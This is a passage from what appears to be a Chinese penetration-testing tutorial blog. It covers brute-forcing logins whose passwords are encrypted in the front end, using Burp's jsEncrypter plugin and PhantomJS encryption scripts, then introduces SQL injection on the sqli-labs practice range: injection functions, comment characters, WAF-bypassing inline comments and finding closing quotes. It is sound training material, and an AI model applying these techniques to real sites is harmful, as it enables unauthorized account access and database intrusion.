<p><strong>单步跳出</strong>：当前运行在自定义函数（def）里时，如果在该自定义函数里没有断点，则会直接运行完当前自定义函数，停在调用函数的那一行</p>
<p><strong>重启</strong>：重新启动debug程序</p>
<p><strong>停止</strong>：结束程序</p>
<h6 id="3-变量监视"><a href="#3-变量监视" class="headerlink" title="3.变量监视"></a>3.变量监视</h6><p>一般在不进行 debug 时会使用print打印某个变量的值，debug可以很轻松的监视每个变量的值。</p>
<p><img src="/2023/012220963/34.png" alt="34"></p>
<h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><p>在我们渗透过程在，经常会发现没有验证码，也没有登录次数限制，但是用户名密码都是加密的，如果只是md5加密或者hash，burp的Intruder模块自带加密爆破功能，但是如果是自定义的加密方式，或者多层md5此时就没法直接爆破了。这种情况都是前端调用 javascript代码对提交内容进行了加密，通过代码调试可以找到加密函数，使用与其相同的加密函数处理数据提交即可。</p>
<h4 id="常见前端加密"><a href="#常见前端加密" class="headerlink" title="常见前端加密"></a>常见前端加密</h4><h5 id="base64加密与解密"><a href="#base64加密与解密" class="headerlink" title="base64加密与解密"></a>base64加密与解密</h5><p>window.atob() 与window.btoa()可以实现对base64格式的数据进行解码和编码，其兼容性是主流浏览器，IE10及以上。</p>
<p>window.atob(encodedStr)只可以解码用btoa方法编码的字符串。</p>
<p>window.btoa()：将ascii字符串或二进制数据转换成一个base64编码过的字符串,但该方法不能直接作用于Unicode字符串。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script&gt;
      var str &#x3D; &#39;RUNOOB&#39;
      var enc &#x3D; window.btoa(str) &#x2F;&#x2F;编码成base64的
      var dec &#x3D; window.atob(enc) &#x2F;&#x2F;把base64解码
      var res &#x3D; &#39;编码字符串为: &#39; + enc + &#39;&lt;br&gt;&#39; + &#39;解码后字符串为: &#39; + dec
      console.log(res)
&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当遇到中文时，需要先对中文转码否则会乱码。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">var str &#x3D; btoa(encodeURIComponent(&quot;中文汉字&quot;));
&#x2F;&#x2F;还可以解码回来
decodeURIComponent(atob(enc)) &#x3D;&gt;  中文汉字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h5><p>首先引入相关js,对要加密的内容直接加密</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;blueimp-md5&#x2F;2.10.0&#x2F;js&#x2F;md5.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;script&gt;
  var b &#x3D;$(&quot;#logPassword&quot;);
  $.md5(b.val())
&lt;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>MD5没有解密算法，或者说解密算法很复杂，所以可以在数据库中存放经过<strong>两次MD5</strong>加密的的内容，也可以再配合加‘盐’ salt</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">console.log(md5(md5(&quot;123456&quot;) + &quot;a&quot;));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h5 id="sha1加密"><a href="#sha1加密" class="headerlink" title="sha1加密"></a>sha1加密</h5><p>首先引入相关js,对要加密的内容直接加密</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script type&#x3D;&quot;text&#x2F;ecmascript&quot; src&#x3D;&quot;sha1.js&quot;&gt;&lt;&#x2F;script&gt;
var sha &#x3D; hex_sha1(&#39;mima123465&#39;);
console.log(sha);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="RSA用公钥私钥加密解密"><a href="#RSA用公钥私钥加密解密" class="headerlink" title="RSA用公钥私钥加密解密"></a>RSA用公钥私钥加密解密</h5><p>首先引入相关配置文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;js&#x2F;jsencrypt.js&quot;&gt;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>前端在向后台发起登录请求之前，先请求后台获取公钥的方法</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">var publicKey &#x3D; null;
$.ajax(&#123;
 			url: &quot;xxx&quot;,
 			type: &quot;post&quot;,
 			dataType: &quot;text&quot;,
 			success: function(data) &#123;
 				var encrypt &#x3D; new JSEncrypt();
 				if(data)&#123;
 					publicKey &#x3D; data;
 				&#125;;
 			&#125;
&#125;);
&#x2F;&#x2F; 通过公钥对用户名和密码加密
encrypt.setPublicKey(publicKey);
var username;
var password;
username &#x3D; encrypt.encrypt(vm.username.trim());
password &#x3D; encrypt.encrypt(vm.password.trim());
&#x2F;&#x2F; 接下来就是用加密后的用户名密码请求后台
$.ajax(&#123;
 	type: &quot;POST&quot;,
 	url: &quot;xxxxxx&quot;,
 	data: &#123;
   		&quot;username&quot;:username,
 		&quot;password&quot;:password,
 	&#125;,
 	  dataType: &quot;json&quot;,
 	  success: function (result) &#123;
 			if (result.code &#x3D;&#x3D; 0) &#123;&#x2F;&#x2F;登录成功
 			parent.location.href &#x3D; &#39;index.html&#39;;
 			&#125; else &#123;
 				vm.error &#x3D; true;
  	 			vm.errorMsg &#x3D; result.msg;
 				vm.refreshCode();
 			&#125;
 		&#125;
 &#125;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="练习靶场"><a href="#练习靶场" class="headerlink" title="练习靶场"></a>练习靶场</h4><p><strong>待补充</strong></p>
<h4 id="浏览器调试前端代码"><a href="#浏览器调试前端代码" class="headerlink" title="浏览器调试前端代码"></a>浏览器调试前端代码</h4><h5 id="找加密函数"><a href="#找加密函数" class="headerlink" title="找加密函数"></a>找加密函数</h5><p>通过查看源码，审查元素等方式找到加密数据的函数</p>
<p><strong>打开浏览器调试</strong></p>
<p><strong>找到加密函数</strong></p>
<h5 id="打断点debug"><a href="#打断点debug" class="headerlink" title="打断点debug"></a>打断点debug</h5><p>断点的位置很有考究，调试的代码越少越利于我们分析，根据经验尽量精准的选择代码</p>
<h5 id="触发加密函数"><a href="#触发加密函数" class="headerlink" title="触发加密函数"></a>触发加密函数</h5><p>一般来说，点击登陆即可触发加密函数，点击登陆后代码暂停在了断点处</p>
<h5 id="调试（继续、单步、步进、步出）"><a href="#调试（继续、单步、步进、步出）" class="headerlink" title="调试（继续、单步、步进、步出）"></a>调试（继续、单步、步进、步出）</h5><p>单步（Step into next function call）进入当前函数，一步步执行</p>
<p>步进（Step into next function call）如果在一个函数处步进，可以进入该函数</p>
<p>步出（Step out of current function）如果在一个调用函数中，从此函数退出，回到调用该函数的地方</p>
<p>跨越 (Step over next function call) 执行到下一步的函数调用（跳到下一行）</p>
<h5 id="监视表达式"><a href="#监视表达式" class="headerlink" title="监视表达式"></a>监视表达式</h5><h5 id="下载js加密文件"><a href="#下载js加密文件" class="headerlink" title="下载js加密文件"></a>下载js加密文件</h5><h5 id="还原JS加密文件"><a href="#还原JS加密文件" class="headerlink" title="还原JS加密文件"></a>还原JS加密文件</h5><h5 id="burp插件jsEncrypter"><a href="#burp插件jsEncrypter" class="headerlink" title="burp插件jsEncrypter"></a>burp插件jsEncrypter</h5><p>加密函数已经在本地实现了，先在讲加密函数和burp联动起来</p>
<h6 id="1-安装phantomjs"><a href="#1-安装phantomjs" class="headerlink" title="1.安装phantomjs"></a>1.安装phantomjs</h6><p><strong>简介</strong>：PhantomJS是一个基于webkit的JavaScript API。它使用QtWebKit作为它核心浏览器的功能，使用webkit来编译解释执行JavaScript代码。任何你可以在基于webkit浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如CSS选择器、支持Web标准、DOM操作、JSON、HTML5、</p>
<p>Canvas、SVG等，同时也提供了处理文件I/O的操作，从而使你可以向操作系</p>
<p>统读写文件等。PhantomJS的用处可谓非常广泛，诸如网络监测、网页截</p>
<p>屏、无需浏览器的 Web 测试、页面访问自动化等</p>
<p><strong>配置：</strong>下载 <a target="_blank" rel="noopener" href="https://phantomjs.org/download.html">phantomjs</a>将 bin 目录<strong>添加至环境变量</strong>即可</p>
<p><img src="/2023/012220963/36.PNG" alt="36"></p>
<h6 id="2-安装jsEncrypter"><a href="#2-安装jsEncrypter" class="headerlink" title="2.安装jsEncrypter"></a>2.安装jsEncrypter</h6><p> <a target="_blank" rel="noopener" href="https://github.com/c0ny1/jsEncrypter/releases">下载jsEncrypter</a></p>
<h6 id="3-burp导入插件jsEncrypter"><a href="#3-burp导入插件jsEncrypter" class="headerlink" title="3.burp导入插件jsEncrypter"></a>3.burp导入插件jsEncrypter</h6><p><img src="/2023/012220963/37.png" alt="37"></p>
<h6 id="4-安装靶场webapp"><a href="#4-安装靶场webapp" class="headerlink" title="4.安装靶场webapp"></a>4.安装靶场webapp</h6><p>将靶场文件放在 WWW 目录下即可</p>
<h5 id="burp调用js加密函数"><a href="#burp调用js加密函数" class="headerlink" title="burp调用js加密函数"></a>burp调用js加密函数</h5><p><strong>1.修改 phantomjs_server.js文件，导入js加密函数</strong></p>
<p><strong>2.加入自定义js函数改写后</strong></p>
<p><img src="/2023/012220963/217.PNG" alt=" "></p>
<p><strong>3.启动phantomjs</strong></p>
<p>在jsEncrypter.0.3.2文件夹进行cmd</p>
<p>命令： phantomjs phantomjs_server.js</p>
<p><img src="/2023/012220963/218.PNG" alt=" "></p>
<p>或者</p>
<p><img src="/2023/012220963/221.PNG" alt=" "></p>
<p><strong>4.burp</strong> <strong>插件连接</strong> <strong>phantomjs</strong></p>
<p>插件点击 connect 连接到 phantomjs ，并进行加密函数调用测试</p>
<p><img src="/2023/012220963/219.PNG" alt=" "></p>
<p><strong>5.开始爆破</strong></p>
<p><img src="/2023/012220963/220.PNG" alt=" "></p>
<h3 id="JS加密靶场练习"><a href="#JS加密靶场练习" class="headerlink" title="JS加密靶场练习"></a>JS加密靶场练习</h3><h4 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h4><p>哈希算法（Hash Algorithms）也称为散列算法、杂凑算法或数字指纹，是可以将任意长度的消息压缩为一个固定长度的消息的算法。</p>
<p>哈希算法是区块链技术体系的重要组成部分，也是现代密码学领域的重要分支，在身份认证、数字签名等诸多领域有着广泛的应用。</p>
<p>密码学哈希算法的主要特性就是<strong>单向性</strong>，即在算法上，<strong>只能从输入值计算得到输出值</strong>，而从输出值计算得到输入值是不可行的。</p>
<p>常用的哈希算法包括MD系列算法和SHA系列算法，其中MD系列算法有MD2、MD4、MD5、RIPEMD算法等，SHA系列算法有SHA0、SHA1、SHA2、SHA3算法等</p>
<h5 id="密码解密网站"><a href="#密码解密网站" class="headerlink" title="密码解密网站"></a>密码解密网站</h5><p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a> 、 <a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a> 、<a target="_blank" rel="noopener" href="https://pmd5.com/">https://pmd5.com/</a></p>
<h5 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h5><p>MD5信息摘要算法，一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。通常为为 <strong>32</strong> <strong>位十六进制字符</strong>，16位MD5值是 32位MD5的前16位。</p>
<p><strong>test.html</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;.&#x2F;md5.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;script&gt;
    var password &#x3D; String(&quot;123456&quot;); &#x2F;&#x2F; 注意，这里是字符串
    var en_password &#x3D; hex_md5(password);
    console.log(en_password);
&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>phantomjs_server.js</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&#x2F;&#x2F; 加载实现加密算法的js脚本
var wasSuccessful &#x3D; phantom.injectJs(&#39;md5.js&#39;); &#x2F;*引入实现加密的js文件*&#x2F;
&#x2F;&#x2F; 处理函数
function js_encrypt(payload) &#123;
    var newpayload;
    &#x2F;**********在这里编写调用加密函数进行加密的代码************&#x2F;
    var password &#x3D; String(payload);
    var en_password &#x3D; hex_md5(password);
    newpayload &#x3D; en_password
        &#x2F;**********************************************************&#x2F;
    return newpayload;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="SHA家族名称"><a href="#SHA家族名称" class="headerlink" title="SHA家族名称"></a>SHA家族名称</h5><p>计算机名词发音网站：<a target="_blank" rel="noopener" href="http://www.howtopronounce.cc/sha1">http://www.howtopronounce.cc/sha1</a></p>
<p><img src="/2023/012220963/35.png" alt="35"></p>
<h5 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h5><p>SHA-1 是最广泛使用和设置的加密哈希函数之一，SSL 证书颁发机构经常使用它来签署证书。SHA-1 是一个 160 位散列，它接受一个输入并生成一个 160 位（20 字节）的散列值，称为消息摘要。它通常由一个 <strong>40</strong> <strong>位长的十六进制字符</strong>串描述。</p>
<h5 id="SHA256"><a href="#SHA256" class="headerlink" title="SHA256"></a>SHA256</h5><p>SHA256算法使用的哈希值长度是256位。这是一个抽象类，此类的唯一实现是<em>SHA256</em>Managed。对于任意长度的消息，SHA256都会产生一个256bit长度的散列值，称为消息摘要，可以用一个<strong>长度为64</strong>的十六进制字符串**表示</p>
<h5 id="SHA384"><a href="#SHA384" class="headerlink" title="SHA384"></a>SHA384</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>96</strong></strong>的十六进制</strong>字符串表示</p>
<h5 id="SHA512"><a href="#SHA512" class="headerlink" title="SHA512"></a>SHA512</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>128</strong></strong>的十六进制</strong>字符串表示</p>
<h4 id="密码加盐（Salt）"><a href="#密码加盐（Salt）" class="headerlink" title="密码加盐（Salt）"></a>密码加盐（Salt）</h4><p>原始密码加密后的哈希值存储在数据库中依然是不够安全的，那么有什么好的办法来解决这个问题呢？答案是加盐。盐（Salt）是什么？就是一个随机生成的字符串。我们将盐与原始密码连接（concat）在一起（放在前面或后面都可以），然后将concat后的字符串加密。采用这种方式加密密码，查表法就不灵了（因为盐是随机生成的）。</p>
<h5 id="加盐练习"><a href="#加盐练习" class="headerlink" title="加盐练习"></a>加盐练习</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123456"</span>    <span class="token comment"># --post传入的参数</span>
salt <span class="token operator">=</span> <span class="token string">"salt123"</span>
<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
    m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    pass1 <span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> pass1
<span class="token keyword">def</span> <span class="token function">w</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
    m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> salt<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 盐可以加在任何位置</span>
    pass2 <span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> pass2
<span class="token keyword">print</span><span class="token punctuation">(</span>w<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p><strong>RSA****是一种非对称加密算法</strong>，加密算法分为对称加密算法和非对称加密算法,其中非对称加密算法作为计算机通信安全的基石,在保证数据安全方面起着重要的作用。</p>
<p><strong>非对称加密</strong>(公钥加密)：指加密和解密使用不同密钥的加密算法，也称为<strong>公私钥加密</strong>。假设两个用户要加密交换数据，双方交换公钥，使用时一方用对方的<strong>公钥加密</strong>，另一方即可用自己的<strong>私钥解密</strong>。</p>
<h5 id="找公钥"><a href="#找公钥" class="headerlink" title="找公钥"></a>找公钥</h5><p>公钥是公开的，因为公钥只能用来加密，不能用来解密，所以公钥在网站的前端代码里能够找到</p>
<h5 id="编写加密函数"><a href="#编写加密函数" class="headerlink" title="编写加密函数"></a>编写加密函数</h5><p><strong>rsa.html</strong></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&lt;script src&#x3D;&quot;.&#x2F;jsencrypt.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;script&gt;
    var public_key &#x3D;
&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0Llg1bVZhnyslfezwfeOkvnXWq59bDtmQyHvxkP&#x2F;
38Fw8QQXBfROCgzGc+Te6pOPl6Ye+vQ1rAnisBaP3rMk40i3OpallzVkuwRKydek3V9ufPpZEEH4eBgI
nMSDiMsggTWxcI&#x2F;Lvag6eHjkSc67RTrj96oxj0ipVRqjxW4X6HQIDAQAB&quot;;
    var password &#x3D; &quot;123456&quot;;
    var encrypt &#x3D; new JSEncrypt();
    encrypt.setPublicKey(public_key);
    en_password &#x3D; encrypt.encrypt(password);
    console.log(en_password)
&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>phantomjs_server.js</strong></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> 加载实现加密算法的js脚本
var wasSuccessful <span class="token operator">=</span> phantom<span class="token punctuation">.</span>injectJs<span class="token punctuation">(</span><span class="token string">'jsencrypt.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">*</span>引入实现加密的js文件<span class="token operator">*</span><span class="token operator">/</span>
<span class="token operator">//</span> 处理函数
function js_encrypt<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    var newpayload<span class="token punctuation">;</span>
    <span class="token operator">/</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>在这里编写调用加密函数进行加密的代码<span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">/</span>
    var public_key <span class="token operator">=</span>
"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0Llg1bVZhnyslfezwfeOkvnXWq59bDtmQyHvxkP<span class="token operator">/</span>
38Fw8QQXBfROCgzGc<span class="token operator">+</span>Te6pOPl6Ye<span class="token operator">+</span>vQ1rAnisBaP3rMk40i3OpallzVkuwRKydek3V9ufPpZEEH4eBgI
nMSDiMsggTWxcI<span class="token operator">/</span>Lvag6eHjkSc67RTrj96oxj0ipVRqjxW4X6HQIDAQAB"<span class="token punctuation">;</span>
    var password <span class="token operator">=</span> String<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    var encrypt <span class="token operator">=</span> new JSEncrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    encrypt<span class="token punctuation">.</span>setPublicKey<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    en_password <span class="token operator">=</span> encrypt<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
    newpayload <span class="token operator">=</span> en_password
        <span class="token operator">/</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">/</span>
    <span class="token keyword">return</span> newpayload<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="SQL注入漏洞1"><a href="#SQL注入漏洞1" class="headerlink" title="SQL注入漏洞1"></a>SQL注入漏洞1</h2><h3 id="靶场环境搭建"><a href="#靶场环境搭建" class="headerlink" title="靶场环境搭建"></a>靶场环境搭建</h3><h4 id="phpstudy切换版本"><a href="#phpstudy切换版本" class="headerlink" title="phpstudy切换版本"></a>phpstudy切换版本</h4><p>配置 phpstudy 中 php 版本为 5.x ，mysql 版本为 5.7.x</p>
<h4 id="sqli-labs数据库初始化"><a href="#sqli-labs数据库初始化" class="headerlink" title="sqli-labs数据库初始化"></a>sqli-labs数据库初始化</h4><p>初次使用靶场要进行初始化操作，安装数据库</p>
<p><img src="/2023/012220963/38.PNG" alt="38"></p>
<p>显示 successfully 表示安装成功~！</p>
<p><img src="/2023/012220963/39.PNG" alt="39"></p>
<p><strong>默认文件中mysql密码为空，要根据自己mysql密码来修改</strong></p>
<h4 id="hackbar插件安装"><a href="#hackbar插件安装" class="headerlink" title="hackbar插件安装"></a>hackbar插件安装</h4><p>从文件安装附件组件（HackBar V2目前免费使用）</p>
<p><img src="/2023/012220963/40.PNG" alt="40"></p>
<h3 id="mysql注入常见函数"><a href="#mysql注入常见函数" class="headerlink" title="mysql注入常见函数"></a>mysql注入常见函数</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">函数 <span class="token operator">/</span> 语句                     功能

<span class="token keyword">order</span> <span class="token keyword">by</span>                       按指定列排序，可判断查询结果列数
<span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                         当前用户名
<span class="token keyword">current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                 当前用户名（可用来查看权限）
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                     当前所用数据库
@<span class="token variable">@datadir</span>                      数据库的路径
version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> @<span class="token variable">@version</span>          数据库的版本
@<span class="token variable">@version_compile_os</span> 		   查看操作系统版本
concat<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span> 			   连接 N 个字符串
concat_ws<span class="token punctuation">(</span>separator<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span> 用分隔符连接两个字段的字符串
group_concat<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span> 	   将多行查询结果以逗号分隔全部输出
substr<span class="token punctuation">(</span>string<span class="token punctuation">,</span><span class="token keyword">start</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span>    将目标字符串从strat位置截取指定长度
<span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>                      返回结果中的前几条数据或者中间的数据
<span class="token function">COUNT</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>             返回指定列的值的数目（<span class="token boolean">NULL</span> 不计入）
sleep<span class="token punctuation">(</span>num<span class="token punctuation">)</span>                     让语句暂停num秒的时间
<span class="token keyword">if</span><span class="token punctuation">(</span>condition<span class="token punctuation">,</span> result1<span class="token punctuation">,</span> result2<span class="token punctuation">)</span> 判断一个条件，条件为真执行结果<span class="token number">1</span>，否则执行结果<span class="token number">2</span>
load_file<span class="token punctuation">(</span><span class="token punctuation">)</span>                    读文件操作
<span class="token keyword">Into</span> <span class="token keyword">outfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> 写文件操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="SQL注入中的注释符"><a href="#SQL注入中的注释符" class="headerlink" title="SQL注入中的注释符"></a>SQL注入中的注释符</h3><p>注释符用于将注入点中原有的sql语句后半段注释掉，以保证sql语句能够正常执行</p>
<pre class="line-numbers language-none"><code class="language-none">单行注释：#后面直接加内容
多行注释：&#x2F;**&#x2F;中间可以跨行
单行注释：-- 后面必须加空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h4 id="内敛注释"><a href="#内敛注释" class="headerlink" title="内敛注释"></a>内敛注释</h4><p>内联注释是MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。</p>
<p>为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 /*! … */中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。</p>
<p> /*!50001 */表示数据库版本&gt;=5.00.01时中间的语句才会执行，在SQL注入中，内联注释常用来绕过waf。</p>
<p><img src="/2023/012220963/41.PNG" alt="41"></p>
<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h4><p>得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方</p>
<h5 id="常见注入点在哪里？"><a href="#常见注入点在哪里？" class="headerlink" title="常见注入点在哪里？"></a>常见注入点在哪里？</h5><p>我们一般在三个地方，寻找注入点</p>
<ol>
<li><p>表单中的输入参数</p>
</li>
<li><p>URL中的参数</p>
</li>
<li><p>Cookie或header头中其它参数</p>
</li>
</ol>
<p>用户信息、排名公布、文章展示、评论、搜索框、登陆框、cookie（session持久化需要存储在数据库中）</p>
<pre class="line-numbers language-none"><code class="language-none">1.与数据库有交互
2.参数可控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h5 id="sqli-less1"><a href="#sqli-less1" class="headerlink" title="sqli-less1"></a>sqli-less1</h5><p>发现提交 id 参数值的改变，影响页面结果，猜测后台的sql代码是： select 账号 密码 from 用户表;</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select username,password from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/012220963/42.PNG" alt="42"></p>
<h4 id="2-测试注入点-amp-amp-判断闭合符号"><a href="#2-测试注入点-amp-amp-判断闭合符号" class="headerlink" title="2.测试注入点&amp;&amp;判断闭合符号"></a>2.测试注入点&amp;&amp;判断闭合符号</h4><p>常用的测试符号</p>
<ul>
<li><p>单引号 ‘</p>
</li>
<li><p>双引号 “</p>
</li>
<li><p>无符号(直接拼接)</p>
</li>
<li><p>圆括号 ()</p>
</li>
</ul>
<p>这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句；</p>
<h5 id="根据报错信息判断闭合符号"><a href="#根据报错信息判断闭合符号" class="headerlink" title="根据报错信息判断闭合符号"></a>根据报错信息判断闭合符号</h5><p><strong>输入</strong>常用<strong>闭合符</strong>号<strong>使</strong>页面抛出<strong>sql****语法</strong>错误的<strong>报错</strong>信息，根据报错信息可以发现闭合符号</p>
<p>less1</p>
<p><img src="/2023/012220963/43.PNG" alt="43"></p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 最外层的一对单引号是 mysql 报错打印模块自己加上的，去除掉以后，得到原始的报错代码段
报错字符串为： &#39;&#39;3&#39;&#39; LIMIT 0,1&#39;
# 去掉 最外层的一对引号
原始报错代码： &#39;3&#39;&#39; LIMIT 0,1
# 去掉我们输入的代码
我们输入的值为： 3&#39; 由此即可判断出后台包裹变量字符串的符号为 单引号 &#39;
# 使用注释符号，注释掉后边的sql语句
